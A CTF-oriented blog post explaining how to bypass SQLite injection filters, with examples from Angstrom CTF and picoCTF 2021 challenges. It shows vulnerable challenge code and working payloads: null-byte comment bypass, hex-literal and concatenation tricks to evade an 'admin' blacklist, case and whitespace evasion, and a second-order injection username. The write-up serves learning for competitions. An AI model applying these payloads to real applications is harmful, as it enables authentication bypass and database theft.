---
layout: "post"
title: "Some SQLite Injection"
date: "2021-04-10 14:44:16"
date_gmt: "2021-04-10 14:44:16"
modified: "2021-04-10 14:44:16"
modified_gmt: "2021-04-10 14:44:16"
slug: "some-sqlite-injection"
author: "brandonshi123"
status: "publish"
type: "post"
original_url: "https://y4y.space/2021/04/10/some-sqlite-injection/"
guid: "https://y4y.space/?p=392"
wordpress_id: 392
parent_id: 0
categories: ["Uncategorized"]
---

{% raw %}
## About this post

Maybe it's just a coincidence, but I have been noticing a lot of SQLite Injections lately. From last year's Pico Mini Competition, to the recent concluded Pico 2021 and Angstrom CTF, they all have some degrees of SQLite filter bypassing problems in the event. I want to take the chance and talk about some basic bypassing technique. Why basic? Because I don't how the advanced bypassing looks like.

## The actual content

The most obvious way to spot a SQL injection would be appending a `'` or `"` after whatever the value is. Like

```ini
username=user1'&password=letmein"
```

When the server responds with something unusual, then you know something is up. Developers will mostly be smart enough to not show the error message, but that still happens. The error message is gold, and you should totally take advantage of that.

### When you are not allowed to comment

That is to say, when `/**/` or `-- -` and other comment keywords are filtered.

#### Sea Quills 1 - Angstrom CTF 2021

One example would be from the Sea Quills problem from Angstrom CTF 2021, here is the code which matters:

```sql
post '/quills' do
        db = SQLite3::Database.new "quills.db"
        cols = params[:cols]
        lim = params[:limit]
        off = params[:offset]

        blacklist = ["-", "/", ";", "'", "\""]

        blacklist.each { |word|
                if cols.include? word
                        return "beep boop sqli detected!"
                end
        }

        if !/^[0-9]+$/.match?(lim) || !/^[0-9]+$/.match?(off)
                return "bad, no quills for you!"
        end

        @row = db.execute("select %s from quills limit %s offset %s" % [cols, lim, off])
```

You see, the `lim` and `off` variable has to be a number, otherwise it would not do anything. And also, no comment for us so we cannot just simply inject the `cols` variable and let to do the query.

In this case, we can use a null byte to bypass it, since null byte is always considered to be a string terminator. Then the query can be like

```ini
lim=1&off=1&cols=flag+from+flagtable%00
```

and note that the data above is url-encoded, normally you can't type a null byte. Then send it with burp, and you will get your result.

The similar problems are from the Web Gauntlet series from Pico CTF, and speaking of that, don't forget to check out [our team's amazing write-up of Pico CTF 2021](https://www.ctfwriteup.com/picoctf/picoctf-2021). My write-up for some web challenges are also there.

### When some keywords are blocked

Like table name, user name or some other SQL keywords.

#### Web Gauntlet 3 - Pico CTF 2021

I choose this because it's the hardest from the Web Gauntlet series.

Here is the source code for the challenge.

```html
<?php
session_start();

if (!isset($_SESSION["winner3"])) {
    $_SESSION["winner3"] = 0;
}
$win = $_SESSION["winner3"];
$view = ($_SERVER["PHP_SELF"] == "/filter.php");

if ($win === 0) {
    $filter = array("or", "and", "true", "false", "union", "like", "=", ">", "<", ";", "--", "/*", "*/", "admin");
    if ($view) {
        echo "Filters: ".implode(" ", $filter)."<br/>";
    }
} else if ($win === 1) {
    if ($view) {
        highlight_file("filter.php");
    }
    $_SESSION["winner3"] = 0;        // <- Don't refresh!
} else {
    $_SESSION["winner3"] = 0;
}

// picoCTF{k3ep_1t_sh0rt_eb90a623e2c581bcd3127d9d60a4dead}
?>
```

The point of the challenge is to bypass authentication, so we don't need to leak the database or anything.

We also see comment is blocked, and from the last section we know we can counter that with a null byte. The ideal query would be like

```sql
select username, password from users where username='admin' //end of query.
```

But `admin` is blocked, and we know we can't use usernames like `Admin` because that's a totally different user. The solution is to use hex representation and then unhex from that representation. Funny enough that SQLite has a `hex()` function but no `unhex()`. There is still a way to unhex thing though, that is using `X'<hex strings>'`, so we can convert the word `admin` to all hex, and then inject the query like

```sql
select username, password from users where username=X'61646D696E' //end of query.
```

We can also try to concat strings as the PHP code only block the work `admin`, so if we try `ad + min` it still works. In SQLite, the `||` operator does not mean `or`, it means concatenate strings… So we can also inject the query like this:

```sql
select username, password from users where username='ad'||'min' //end of query.
```

But what if we want to dump the database and words like `select`, `union` and other sql clauses are blacklisted? We can try different case combinations like `SeLecT` if the application does not search for a regular expression. Let's say if `/**/` is not blocked, we can also use `se/**/le/**/ct` to bypass

### What if space is blocked

I don't have an example on my hand now, but you can probably imagine that. If a single space character is blocked, then we can bypass that with some other ascii characters like `%09`.

### Second order injection

When I was learning PHP, I saw that one phrase: 'Never trust any user input as a developer'. And yes, it's true, we know it so much. But what if the data is coming from the database? Can we trust that? And for some developers, the answer is yes, because why wouldn't they? That just leaves spaces for us to attack then.

Imagine registering an account for some random website, and they don't really check for sensitive characters in the username, so we give it a username of `'||sqlite_version()||'`, and the entire would look like

```sql
insert into users value (''||sqlite_version()||'', 'a_random_password')
```

We talked about it before, `||` means concatenate strings, so when SQLite is executing the query, it would execute `''||sqlite_version||''` which is just `sqlite_version()` first. Then when we log in, we will see our username being the actual SQLite database version instead. And we can extend this further, dump the database, and if possible, we can even write a shell on the machine to fully compromise it.

One good example is the Startup Company challenge from Pico CTF 2021. Where you can do a second order injection by contributing money. The application will always show the last donation, so by manipulating donation data, we can dump the database that way.

## Conclusion

This basically concludes all the SQLite tricks I know, it should be somewhat helpful. From now on, all the CTF write-ups will be on [our team's write-up website](https://www.ctfwriteup.com/), so check that out. I will mostly be posting some technical stuff, and the next post will be about Cobalt Strike. I will analyze how Cobalt Strike sends malicious payload to target machine, and how the beacon object works in Cobalt Strike, stay tuned.
{% endraw %}
